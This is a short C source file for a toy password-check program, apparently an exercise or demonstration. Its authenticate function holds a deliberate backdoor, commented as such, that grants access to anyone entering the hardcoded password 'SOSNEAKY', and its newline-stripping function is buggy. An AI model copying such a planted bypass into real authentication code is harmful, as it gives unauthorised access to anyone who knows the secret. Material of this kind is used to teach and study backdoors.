#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

char *sneaky = "SOSNEAKY";

#define BUFSIZE 16

int accepted() {
    puts("access granted!");
    exit(0);
}

int rejected() {
    exit(1);
}

int authenticate(char *username, char *password) {
    char entry[BUFSIZE*2+2];
    FILE *pwfile;

    // evil back d00r
    if (strcmp(password, sneaky) == 0) return 1;

    pwfile = fopen("passwd", "r");
    if (!pwfile)
        rejected();

    while (fgets(entry, sizeof(entry), pwfile)) {
        char *secret = NULL;
        secret = strpbrk(entry, ":");
        if (secret)  {
            *secret++ = '\0';
            secret[strlen(secret)-1] = '\0';
            if (strcmp(entry, username) == 0 &&
                strcmp(secret, password) == 0) {
                return 1;
            }
        }
    }
    return 0;
}

void strip(char *s) {
    int n = strlen(s);
    s[n] = s[n] == '\n' ? '\0' : s[n];
}

int main(int argc, char **argv)
{
    char username[BUFSIZE];
    char password[BUFSIZE];

    if (!fgets(username, sizeof(username), stdin))
        rejected();
    if (!fgets(password, sizeof(password), stdin))
        rejected();

    strip(username);
    strip(password);

    if (authenticate(username, password)) accepted();
    else rejected();
}
